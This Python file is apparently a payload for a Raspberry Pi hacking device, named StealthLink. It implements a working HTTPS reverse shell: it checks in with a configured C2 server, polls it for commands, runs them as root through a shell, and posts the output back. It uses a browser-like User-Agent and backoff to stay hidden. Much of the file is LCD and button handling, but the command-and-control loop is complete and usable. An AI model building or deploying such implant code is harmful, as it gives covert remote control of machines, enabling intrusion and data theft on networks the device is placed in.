#!/usr/bin/env python3
"""
RaspyJack Payload -- StealthLink (HTTPS Stealth Reverse Shell)
---------------------------------------------------------------
Author: 7h30th3r0n3

Reverse shell over HTTPS with keepalive and exponential backoff.
Polls a server for commands via GET, sends output via POST.

Config: /root/Raspyjack/loot/StealthLink/config.json
  {
    "server_url": "https://your-server.com/c2",
    "auth_token": "your-secret-token",
    "poll_interval": 5
  }

Controls:
  KEY1     = start/stop connection
  KEY2     = show connection log
  KEY3     = exit
"""

import os
import sys
import time
import signal
import json
import subprocess
import threading
import urllib.request
import urllib.error
import ssl
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

DEBOUNCE = 0.25
ROW_H = 12
CONFIG_PATH = "/root/Raspyjack/loot/StealthLink/config.json"
MAX_LOG = 40
DEFAULT_POLL = 5
MAX_BACKOFF = 300  # 5 minutes max backoff

running = True


def _signal_handler(*_):
    global running
    running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# -------------------------------------------------------------------
# Config
# -------------------------------------------------------------------

def _load_config():
    """Load StealthLink config from file or env vars."""
    server_url = os.environ.get("STEALTHLINK_URL", "")
    auth_token = os.environ.get("STEALTHLINK_TOKEN", "")
    poll_interval = int(os.environ.get("STEALTHLINK_POLL", str(DEFAULT_POLL)))

    if server_url and auth_token:
        return {
            "server_url": server_url,
            "auth_token": auth_token,
            "poll_interval": poll_interval,
        }

    try:
        with open(CONFIG_PATH, "r") as fh:
            cfg = json.load(fh)
        return {
            "server_url": cfg.get("server_url", server_url),
            "auth_token": cfg.get("auth_token", auth_token),
            "poll_interval": cfg.get("poll_interval", poll_interval),
        }
    except (OSError, json.JSONDecodeError):
        return {
            "server_url": server_url,
            "auth_token": auth_token,
            "poll_interval": poll_interval,
        }


# -------------------------------------------------------------------
# HTTPS communication
# -------------------------------------------------------------------

def _create_ssl_context():
    """Create an SSL context for HTTPS connections."""
    ctx = ssl.create_default_context()
    return ctx


def _https_get(server_url, auth_token, endpoint="/poll"):
    """Poll the server for commands via HTTPS GET."""
    url = f"{server_url}{endpoint}"
    req = urllib.request.Request(url, method="GET")
    req.add_header("Authorization", f"Bearer {auth_token}")
    req.add_header("User-Agent", "Mozilla/5.0")
    req.add_header("X-Client-ID", _get_client_id())

    ctx = _create_ssl_context()
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            data = resp.read().decode()
            if resp.status == 204 or not data.strip():
                return {"command": None}, None
            return json.loads(data), None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode() if exc.fp else ""
        return None, f"HTTP {exc.code}: {body[:50]}"
    except urllib.error.URLError as exc:
        return None, f"Net: {str(exc.reason)[:40]}"
    except json.JSONDecodeError:
        return None, "Invalid JSON response"
    except Exception as exc:
        return None, str(exc)[:50]


def _https_post(server_url, auth_token, payload, endpoint="/result"):
    """Send command output back via HTTPS POST."""
    url = f"{server_url}{endpoint}"
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Authorization", f"Bearer {auth_token}")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0")
    req.add_header("X-Client-ID", _get_client_id())

    ctx = _create_ssl_context()
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            return json.loads(resp.read().decode()), None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode() if exc.fp else ""
        return None, f"HTTP {exc.code}: {body[:50]}"
    except urllib.error.URLError as exc:
        return None, f"Net: {str(exc.reason)[:40]}"
    except Exception as exc:
        return None, str(exc)[:50]


def _get_client_id():
    """Generate a stable client identifier."""
    try:
        hostname = subprocess.check_output(
            ["hostname"], text=True, timeout=5,
        ).strip()
        return f"rj-{hostname}"
    except Exception:
        return "rj-unknown"


# -------------------------------------------------------------------
# Command execution
# -------------------------------------------------------------------

def _execute_command(cmd_str):
    """Execute a shell command and return output."""
    if not cmd_str or not cmd_str.strip():
        return "(empty command)"
    try:
        result = subprocess.run(
            cmd_str, shell=True, capture_output=True, text=True,
            timeout=60, cwd="/root",
        )
        output = result.stdout + result.stderr
        if not output.strip():
            return f"(exit {result.returncode})"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "(timed out after 60s)"
    except OSError as exc:
        return f"Error: {str(exc)[:100]}"


# -------------------------------------------------------------------
# Connection state
# -------------------------------------------------------------------

class LinkState:
    """Thread-safe state for the StealthLink connection."""

    def __init__(self):
        self.connected = False
        self.active = False
        self.last_poll = ""
        self.cmd_count = 0
        self.error_count = 0
        self.current_backoff = 0
        self.log_lines = []
        self.lock = threading.Lock()

    def add_log(self, msg):
        """Add a log entry."""
        ts = datetime.now().strftime("%H:%M:%S")
        with self.lock:
            new_lines = list(self.log_lines)
            new_lines.append(f"[{ts}] {msg}")
            if len(new_lines) > MAX_LOG:
                new_lines = new_lines[-MAX_LOG:]
            self.log_lines = new_lines

    def get_snapshot(self):
        """Return immutable snapshot of state."""
        with self.lock:
            return {
                "connected": self.connected,
                "active": self.active,
                "last_poll": self.last_poll,
                "cmd_count": self.cmd_count,
                "error_count": self.error_count,
                "current_backoff": self.current_backoff,
                "log_lines": list(self.log_lines),
            }

    def update(self, **kwargs):
        """Thread-safe field update."""
        with self.lock:
            for key, val in kwargs.items():
                if hasattr(self, key):
                    setattr(self, key, val)


# -------------------------------------------------------------------
# Polling thread
# -------------------------------------------------------------------

def _connection_loop(config, state):
    """Background thread: poll server, execute commands, report results."""
    server_url = config["server_url"]
    auth_token = config["auth_token"]
    base_interval = config["poll_interval"]
    backoff = base_interval

    # Send initial check-in
    checkin_payload = {
        "type": "checkin",
        "client_id": _get_client_id(),
        "timestamp": datetime.now().isoformat(),
    }
    _https_post(server_url, auth_token, checkin_payload, "/checkin")

    while running and state.active:
        poll_time = datetime.now().strftime("%H:%M:%S")
        state.update(last_poll=poll_time)

        data, err = _https_get(server_url, auth_token)

        if err:
            state.update(connected=False, error_count=state.error_count + 1)
            state.add_log(f"Err: {err[:25]}")

            # Exponential backoff
            backoff = min(backoff * 2, MAX_BACKOFF)
            state.update(current_backoff=backoff)
            state.add_log(f"Backoff: {backoff}s")

            # Sleep in small increments so we can exit quickly
            elapsed = 0
            while elapsed < backoff and running and state.active:
                time.sleep(1)
                elapsed += 1
            continue

        # Success -- reset backoff
        backoff = base_interval
        state.update(connected=True, current_backoff=0)

        command = data.get("command") if data else None
        cmd_id = data.get("id", "") if data else ""

        if command:
            state.add_log(f"Cmd: {command[:20]}")
            output = _execute_command(command)
            state.update(cmd_count=state.cmd_count + 1)

            # Send result back
            result_payload = {
                "id": cmd_id,
                "client_id": _get_client_id(),
                "output": output,
                "timestamp": datetime.now().isoformat(),
            }
            _, post_err = _https_post(server_url, auth_token, result_payload)
            if post_err:
                state.add_log(f"Post err: {post_err[:20]}")
        else:
            state.add_log("Poll: no commands")

        # Normal interval sleep
        elapsed = 0
        while elapsed < base_interval and running and state.active:
            time.sleep(1)
            elapsed += 1

    state.update(connected=False, active=False)
    state.add_log("Connection stopped")


# -------------------------------------------------------------------
# Display functions
# -------------------------------------------------------------------

def _draw_header(d, title, right_text="K3"):
    """Draw header bar."""
    d.rectangle((0, 0, 127, 13), fill="#0d1117")
    d.text((2, 1), title, font=font, fill="#58a6ff")
    d.text((108, 1), right_text, font=font, fill="white")


def _draw_footer(d, text):
    """Draw footer bar."""
    d.rectangle((0, 116, 127, 127), fill="#0d1117")
    d.text((2, 117), text, font=font, fill="#666666")


def _draw_status(state_snap):
    """Draw main status screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "StealthLink")

    connected = state_snap["connected"]
    active = state_snap["active"]

    # Connection indicator
    if active:
        status_color = "#00ff88" if connected else "#ff8800"
        status_text = "CONNECTED" if connected else "CONNECTING"
    else:
        status_color = "#666666"
        status_text = "STOPPED"

    d.rectangle((2, 18, 8, 24), fill=status_color)
    d.text((12, 17), status_text, font=font, fill=status_color)

    # Stats
    d.text((2, 32), f"Last poll: {state_snap['last_poll'] or 'N/A'}", font=font, fill="#aaaaaa")
    d.text((2, 44), f"Commands: {state_snap['cmd_count']}", font=font, fill="#aaaaaa")
    d.text((2, 56), f"Errors: {state_snap['error_count']}", font=font, fill="#aaaaaa")

    if state_snap["current_backoff"] > 0:
        d.text((2, 68), f"Backoff: {state_snap['current_backoff']}s", font=font, fill="#ff8800")

    # Last few log lines
    y = 82
    log = state_snap["log_lines"]
    for line in log[-3:]:
        d.text((2, y), line[:20], font=font, fill="#555555")
        y += ROW_H

    toggle_text = "K1=stop" if active else "K1=start"
    _draw_footer(d, f"{toggle_text} K2=log")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_log(log_lines, scroll):
    """Draw scrollable connection log."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Conn Log")

    visible = 8
    y = 16
    end = min(len(log_lines), scroll + visible)
    for idx in range(scroll, end):
        d.text((2, y), log_lines[idx][:20], font=font, fill="#aaaaaa")
        y += ROW_H

    if not log_lines:
        d.text((10, 50), "No log entries", font=font, fill="#444444")

    if len(log_lines) > visible:
        pos = f"{scroll + 1}/{max(1, len(log_lines) - visible + 1)}"
        d.text((90, 16), pos, font=font, fill="#666666")

    _draw_footer(d, "U/D=scrl KEY3=back")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_no_config():
    """Draw missing config screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "StealthLink")

    d.text((2, 24), "No config found!", font=font, fill="#ff4444")
    d.text((2, 40), "Create config at:", font=font, fill="#aaaaaa")
    d.text((2, 54), CONFIG_PATH[:20], font=font, fill="#ffcc00")
    d.text((2, 70), "Fields:", font=font, fill="#aaaaaa")
    d.text((2, 82), "server_url", font=font, fill="#58a6ff")
    d.text((2, 94), "auth_token", font=font, fill="#58a6ff")
    d.text((2, 106), "poll_interval", font=font, fill="#58a6ff")

    _draw_footer(d, "KEY3=exit")
    LCD.LCD_ShowImage(img, 0, 0)


# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------

def main():
    """Main entry point."""
    config = _load_config()

    if not config["server_url"] or not config["auth_token"]:
        try:
            _draw_no_config()
            while running:
                btn = get_button(PINS, GPIO)
                if btn == "KEY3":
                    break
                time.sleep(0.1)
        finally:
            LCD.LCD_Clear()
            GPIO.cleanup()
        return 0

    state = LinkState()
    state.add_log("StealthLink ready")

    last_press = 0.0
    mode = "status"  # status | log
    log_scroll = 0
    conn_thread = None

    try:
        while running:
            btn = get_button(PINS, GPIO)
            now = time.time()

            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            if mode == "log":
                if btn == "KEY3":
                    mode = "status"
                elif btn == "UP":
                    log_scroll = max(0, log_scroll - 1)
                elif btn == "DOWN":
                    snap = state.get_snapshot()
                    max_s = max(0, len(snap["log_lines"]) - 8)
                    log_scroll = min(max_s, log_scroll + 1)

                snap = state.get_snapshot()
                _draw_log(snap["log_lines"], log_scroll)
                time.sleep(0.08)
                continue

            # Status mode
            if btn == "KEY3":
                break

            elif btn == "KEY1":
                if state.active:
                    # Stop connection
                    state.update(active=False)
                    state.add_log("Stopping...")
                    if conn_thread and conn_thread.is_alive():
                        conn_thread.join(timeout=5)
                    conn_thread = None
                else:
                    # Start connection
                    state.update(active=True, error_count=0)
                    state.add_log("Starting connection")
                    conn_thread = threading.Thread(
                        target=_connection_loop,
                        args=(config, state),
                        daemon=True,
                    )
                    conn_thread.start()

            elif btn == "KEY2":
                mode = "log"
                log_scroll = 0

            snap = state.get_snapshot()
            _draw_status(snap)
            time.sleep(0.08)

    finally:
        state.update(active=False)
        if conn_thread and conn_thread.is_alive():
            conn_thread.join(timeout=3)
        LCD.LCD_Clear()
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
